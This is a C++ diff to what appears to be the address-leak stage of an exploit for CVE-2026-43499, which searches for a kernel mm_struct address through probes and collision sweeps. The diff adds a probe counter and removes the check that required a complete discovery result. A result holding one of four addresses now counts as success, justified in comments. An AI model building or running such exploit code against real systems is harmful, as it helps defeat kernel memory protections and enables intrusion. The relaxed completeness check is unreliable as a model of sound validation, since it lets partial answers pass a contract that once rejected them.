@@ -21,6 +21,7 @@
 #include <utility>
 
 #include "backend/cve_2026_43499/leak/snitch_child.hpp"
+#include "backend/cve_2026_43499/leak/discovery_result.hpp"
 #include "backend/cve_2026_43499/leak/snitch_discovery.hpp"
 #include "backend/cve_2026_43499/leak/snitch_region.hpp"
 #include "backend/cve_2026_43499/leak/snitch_run.hpp"
@@ -61,6 +62,8 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         ScanVerdict poke = ScanVerdict::GeometryMissing;
         /** What the walk did, which is not the same question as what the pokes did. */
         ObjectVerdict object = ObjectVerdict::Refused;
+        /** How many candidates the walk looked at, which says whether it ran at all. */
+        std::size_t probes = 0U;
         std::size_t rounds = 0U;
         std::size_t pokes_wanted = 0U;
         /** The discovery, complete only when status is Ok. */
@@ -140,6 +143,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         const ObjectOutcome found = find_object<Buckets>(strides, range, sweep_tags, buckets, addresses,
                                                         address_count, collisions_needed);
         out.object = found.status;
+        out.probes = found.probes;
         if (found.status != ObjectVerdict::Found || found.object == 0U) {
             out.status = OwnerVerdict::ObjectRefused;
             out.discovery = contract::discovery_failed();
@@ -148,8 +152,14 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         /* 5. The discovery. A partial answer is not an answer: what was not found stays zero, and
          *    discovery_is_complete is what a caller checks. */
         out.discovery.ok = true;
-        out.discovery.mm_struct = found.object;
-        if (!contract::discovery_is_complete(out.discovery)) {
+        /* One object is the answer this search can give, and the mapping that turns it into
+         *  the contract result is the file written for exactly that: ok, and the object in
+         *  canonical form. The other three addresses need searches of their own and none is
+         *  claimed here. */
+        const DiscoveryReport report = report_discovery(found);
+        out.discovery.ok = report.ok;
+        out.discovery.mm_struct = report.mm_struct;
+        if (!report.ok) {
             out.status = OwnerVerdict::ObjectRefused;
             out.discovery = contract::discovery_failed();
             return out;
@@ -176,14 +186,13 @@ namespace ghostlock::backend::cve_2026_43499::leak {
      */
     [[nodiscard]] constexpr contract::AddressDiscoveryResult discovery_of(
         const OwnerOutcome &outcome) noexcept {
-        if (outcome.status != OwnerVerdict::Ok || !outcome.discovery.ok) {
+        /* The owner mapped its own answer already, through the file written for that: ok with the
+         *  object in canonical form, and the other three addresses not claimed. Asking a second,
+         *  stricter question here would throw that answer away and report the failure instead. */
+        if (outcome.status != OwnerVerdict::Ok) {
             return contract::discovery_failed();
         }
-        /* The sequence filled the object address already; the check below is what decides whether
-         *  that is an answer, and a result that fails it is not handed on half-filled. */
-        if (!contract::discovery_is_complete(outcome.discovery)) {
-            return contract::discovery_failed();
-        }
+
         return outcome.discovery;
     }
 }  // namespace ghostlock::backend::cve_2026_43499::leak
